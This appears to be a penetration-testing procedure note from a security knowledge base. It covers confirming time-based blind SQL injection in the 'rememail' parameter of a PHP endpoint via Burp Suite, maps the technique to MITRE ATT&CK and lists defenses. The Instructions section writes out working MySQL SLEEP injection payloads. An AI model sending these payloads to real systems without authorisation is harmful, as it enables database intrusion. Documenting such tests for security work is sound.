---
id: proc-uuid-2
tags:
  - sqli
  - time-based
  - blind-sqli
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sleep-injection-test]]'
  - '[[commands/sleep-control-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.968Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test Time-Based SQL Injection

## Summary

This procedure tests for blind SQL injection by injecting SLEEP functions into the rememail parameter, measuring response delays to confirm vulnerability without visible errors.

## Description

The endpoint concatenates user input directly into SQL queries. Time-based blind SQLi exploits this by forcing database sleeps on true conditions, observable via response timing. Used on MySQL backend; delays indicate successful injection.

## Requirements

1. Baseline from previous step
2. Burp Suite Repeater for precise timing
3. Stable network to measure delays accurately

## Defense

Defensive measures and detection strategies:

- Parameterize SQL queries with prepared statements
- Monitor for unusual response times in logs
- Rate-limit requests to detect probing

## Objectives

1. Induce and measure database delay
2. Differentiate from normal behavior
3. Confirm injection point

## Instructions

### Step 1: Inject SLEEP Payload

**Context**: Modify rememail to include a subquery with SLEEP(2) to cause delay.

**Command** ([[commands/sleep-injection-test]]):
```bash
# In Burp Suite: POST https://████████/elist/viewem6.php
# Body: rememail=test@att.net'+(select*from(select(sleep(2)))a)+'
```

> Expect 2-second response delay if vulnerable.

### Step 2: Run Control Payload

**Context**: Test SLEEP(0) to confirm no inherent delays.

**Command** ([[commands/sleep-control-test]]):
```bash
# In Burp Suite: POST https://████████/elist/viewem6.php
# Body: rememail=test@att.net'+(select*from(select(sleep(0)))a)+'
```

> No delay expected, validating the test.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sleep-injection-test]]
- [[commands/sleep-control-test]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- time-based
- blind-sqli
